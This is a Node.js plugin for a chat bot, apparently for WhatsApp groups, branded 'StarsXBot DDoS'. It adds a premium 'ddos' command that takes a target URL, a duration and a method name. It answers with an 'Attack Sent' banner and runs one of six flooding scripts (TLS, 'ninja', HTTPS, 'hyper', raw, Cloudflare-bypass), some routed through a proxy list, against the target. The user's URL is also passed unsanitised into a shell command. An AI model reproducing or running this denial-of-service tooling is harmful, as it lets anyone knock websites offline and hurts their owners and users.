const fetch = require('node-fetch');
const cp = require('child_process');
const { promisify } = require('util');

const exec = promisify(cp.exec);

const cooldowns = new Map();

let handler = async (m, { conn, command, args }) => {
  if (!args[0] || !args[1] || !args[2]) return conn.reply(m.chat, '```[🔎] Please provide both the URL, duration, and methods!```', m);

  const targetUrl = args[0];
  const duration = parseInt(args[1]);
  const methods = args[2];
  const user = m.sender;
  const cooldownTime = duration * 1000;

  if (cooldowns.has(user)) {
    const remainingCooldown = cooldowns.get(user) - Date.now();
    if (remainingCooldown > 0) {
      return conn.reply(
        m.chat,
        `❌ Command is on cooldown. Please wait ${Math.ceil(remainingCooldown / 1000)} seconds.`,
        m
      );
    }
  }

  const hackerIntro = `
======================
[!] StarsXBot DDoS [!]
======================
Target: ${targetUrl}
Duration: ${duration}
Methods: ${methods}
Premium: true
Check-Host: https://check-host.net/check-http?host=${targetUrl}
=======================
`;
  const hackerOutro = 'Power Ngga Stabil Maaf Ya ><';
  cooldowns.set(user, Date.now() + cooldownTime);

  if (methods === "tls") {
  conn.relayMessage(m.chat, {
    extendedTextMessage: {
      text: hackerIntro, 
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          title: '[🚀] Attack Sent [🚀]',
          body: 'StarsXDDoS',
          mediaType: 1,
          previewType: 0,
          renderLargerThumbnail: true,
          thumbnailUrl: 'https://telegra.ph/file/4a33a63cfb493fbf9de84.jpg',
          sourceUrl: `https://check-host.net/check-http?host=${targetUrl}`
        }
      }, 
      mentions: [m.sender]
    }
  }, {});
    exec(`node StarsXTls.js ${targetUrl} ${duration} 100 1 proxy.txt`);
  } else if (methods === 'ninja') {
  conn.relayMessage(m.chat, {
    extendedTextMessage: {
      text: hackerIntro, 
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          title: '[🚀] Attack Sent [🚀]',
          body: 'StarsXDDoS',
          mediaType: 1,
          previewType: 0,
          renderLargerThumbnail: true,
          thumbnailUrl: 'https://telegra.ph/file/4a33a63cfb493fbf9de84.jpg',
          sourceUrl: `https://check-host.net/check-http?host=${targetUrl}`
        }
      }, 
      mentions: [m.sender]
    }
  }, {});
  exec(`node StarsXNinja.js ${targetUrl} ${duration}`);
  } else if (methods === 'https') {
  conn.relayMessage(m.chat, {
    extendedTextMessage: {
      text: hackerIntro, 
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          title: '[🚀] Attack Sent [🚀]',
          body: 'StarsXDDoS',
          mediaType: 1,
          previewType: 0,
          renderLargerThumbnail: true,
          thumbnailUrl: 'https://telegra.ph/file/4a33a63cfb493fbf9de84.jpg',
          sourceUrl: `https://check-host.net/check-http?host=${targetUrl}`
        }
      }, 
      mentions: [m.sender]
    }
  }, {});
  exec(`node StarsXHttps.js ${targetUrl} ${duration}`);
  } else if (methods === 'hyper') {
  conn.relayMessage(m.chat, {
    extendedTextMessage: {
      text: hackerIntro, 
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          title: '[🚀] Attack Sent [🚀]',
          body: 'StarsXDDoS',
          mediaType: 1,
          previewType: 0,
          renderLargerThumbnail: true,
          thumbnailUrl: 'https://telegra.ph/file/4a33a63cfb493fbf9de84.jpg',
          sourceUrl: `https://check-host.net/check-http?host=${targetUrl}`
        }
      }, 
      mentions: [m.sender]
    }
  }, {});
   exec(`node StarsXHyper ${targetUrl} ${duration}`)
  } else if (methods === 'raw') {
  conn.relayMessage(m.chat, {
    extendedTextMessage: {
      text: hackerIntro, 
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          title: '[🚀] Attack Sent [🚀]',
          body: 'StarsXDDoS',
          mediaType: 1,
          previewType: 0,
          renderLargerThumbnail: true,
          thumbnailUrl: 'https://telegra.ph/file/4a33a63cfb493fbf9de84.jpg',
          sourceUrl: `https://check-host.net/check-http?host=${targetUrl}`
        }
      }, 
      mentions: [m.sender]
    }
  }, {});
   exec(`node StarsXRaw ${targetUrl} ${duration}`)
  } else if (methods === 'cfb') {
  conn.relayMessage(m.chat, {
    extendedTextMessage: {
      text: hackerIntro, 
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          title: '[🚀] Attack Sent [🚀]',
          body: 'StarsXDDoS',
          mediaType: 1,
          previewType: 0,
          renderLargerThumbnail: true,
          thumbnailUrl: 'https://telegra.ph/file/4a33a63cfb493fbf9de84.jpg',
          sourceUrl: `https://check-host.net/check-http?host=${targetUrl}`
        }
      }, 
      mentions: [m.sender]
    }
  }, {});
   exec(`node StarsXCfb ${targetUrl} ${duration} 2 proxy.txt`)
  } else m.reply('Invalid Methods')
};

handler.help = ['ddos <url> <duration>'];
handler.tags = ['tools'];

handler.command = /^(ddos)$/i;
handler.premium = true;
handler.group = true;

module.exports = handler;
